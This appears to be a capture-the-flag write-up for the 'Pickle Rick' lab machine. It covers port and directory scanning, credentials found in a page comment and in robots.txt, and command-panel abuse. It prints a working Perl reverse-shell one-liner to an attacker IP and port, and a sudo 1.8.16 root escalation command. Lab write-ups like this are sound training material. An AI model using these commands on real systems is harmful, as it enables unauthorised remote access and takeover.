THE MACHINE IS PICKLE RICK 

For firts thing we run the tool name Nmap: 

	nmap -p- IPMACHINE

we foud two ports open wich there are:

	ssh 22
	http 80

we enter on the website and run the gobaster:

	gobuster dir -u 10.10.196.51 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt,pdf,doc,bak

there are two important page

	/robots.txt
	/login.php 

in the source code on the homepage are found an username: 

	 <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

in the file robots.txt there is the password
sing in on the page login.php
we are into 

We are redirected to /portal.php in which we are given a command panel.

use less for open file Sup3rS3cretPickl3Ingred.txt

	less Sup3rS3cretPickl3Ingred.txt

it's the first flag 
now it's time to do a reverse shell 

	perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


it worked
go around on the file system 
in the directory rick we found the second flag


Now the need  do escalate our privilage.For do that , we use another tool called linepas.
run this on the machine for extract the information for possible privialge escalation. 


one vuln is on the sudo version 1.8.16

	sudo -u#-1 /bin/bash

WE ARE ROOT , STEAL THE LAST FLAG NOW 